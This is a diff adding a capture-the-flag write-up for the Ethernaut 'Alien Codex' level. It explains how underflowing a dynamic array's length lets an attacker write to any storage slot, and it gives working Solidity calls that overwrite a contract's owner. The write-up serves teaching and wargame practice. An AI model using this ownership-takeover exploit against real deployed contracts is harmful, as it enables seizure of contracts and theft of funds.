@@ -1230,3 +1230,94 @@ challenge.setSolver(solverAddress);
 * https://blog.openzeppelin.com/deconstructing-a-solidity-contract-part-i-introduction-832efd2d7737/
 * https://docs.soliditylang.org/en/v0.8.19/assembly.html
 * https://docs.soliditylang.org/en/v0.8.19/yul.html#evm-dialect
+
+## 19 Alien Codex
+
+To beat this level, we need to comply with
+
+```solidity
+instance.owner() ==_player
+```
+
+### Solution
+
+#### `Ownable` contracts
+
+An `Ownable` contract has as first variable `address private _owner`, which is the slot 0. Can we modify it?
+
+Notice that the contract has a variable `bool public contact`, and another `bytes32[] public codex`. Since `owner` is an `address`, it will share the slot 0 with `contact`, then the slot `1` corresponds to`codex`.
+
+#### Array storage
+
+> Assume the storage location of the mapping or array ends up being a slot `p` after applying the storage layout rules. For dynamic arrays, this slot stores the number of elements in the array.
+
+> Array data is located starting at keccak256(p) and it is laid out in the same way as statically-sized array data would: One element after the other, potentially sharing storage slots if the elements are not longer than 16 bytes.
+
+Then, slot `1` will store the length of `codex`, with slot `keccak(1)` its first element, slot `keccak(1) + 1` its second, and so on.
+
+#### Writing the `owner` variable
+
+Look at the function `revise()`
+
+```solidity
+function revise(uint i, bytes32 _content) contacted public {
+  codex[i] = _content;
+}
+```
+
+As an element `i` in the `codex` array is stored at `keccak(1) + i`, one would say "_Why I don't just offset from `keccak256(1)` until reaching the slot 0_?". We cannot, as the EVM will check for the length of the array stored at slot 1.
+
+But, there is this `retract()` function in the contract
+
+```solidity
+function retract() contacted public {
+  codex.length--;
+}
+```
+
+This function can be invoked, and will **underflow** the variable at slot 1, tricking the EVM into believing that the array has `MAX_UINT256` elements. From there we can point to any slot we want.
+
+#### Setting the offset
+
+We need to determine the offset then, let's solve the equation
+
+```
+0x00 = offset + keccak256(1)                // reorganize
+offset = 0x00 - keccak256(1)                // But 0x00 =  MAX_UINT256 + 1
+offset = MAX_UINT256 + 1 - keccak256(1)     // But MAX_UINT256 - x = MAX_UINT256 ^ x
+offset = ( MAX_UINT256 ^ keccak256(1) ) + 1
+```
+
+#### Putting all together
+
+```solidity
+// all the other functions have a modifier
+// requiring you to invoke this one first
+challenge.make_contact();
+
+// this function will underflow the length of the dynamic array at slot1 to 0xff...ff
+// meaning that now the EVM thinks that we have 2**256 - 1 elements there.
+// this way we don't revert on an out of bonds condition.
+challenge.retract();
+
+// now we need our trick to write into slot0 (0x00...00)
+
+// - here is where the first element of codex should be stored
+bytes32 firstElementSlot = keccak256(abi.encodePacked(uint(1)));
+
+// 0x00 = offset + keccak256(1)                // reorganize
+// offset = 0x00 - keccak256(1)                // But 0x00 =  MAX_UINT256 + 1
+// offset = MAX_UINT256 + 1 - keccak256(1)     // But MAX_UINT256 - x = MAX_UINT256 ^ x
+// offset = ( MAX_UINT256 ^ keccak256(1) ) + 1
+uint256 offset = uint256(bytes32(MAX_UINT256) ^ firstElementSlot) + 1;
+
+// write!
+challenge.revise(offset, bytes32(uint256(uint160(address(this)))));
+```
+
+### References
+
+* https://docs.openzeppelin.com/contracts/2.x/access-control
+* https://github.com/OpenZeppelin/openzeppelin-contracts/blob/1c8df659b98177b737fd8af411b30bf24c1cbef1/contracts/access/Ownable.sol#L21
+* https://docs.soliditylang.org/en/v0.8.18/internals/layout_in_storage.html#mappings-and-dynamic-arrays
+* https://solidity-by-example.org/hacks/overflow/
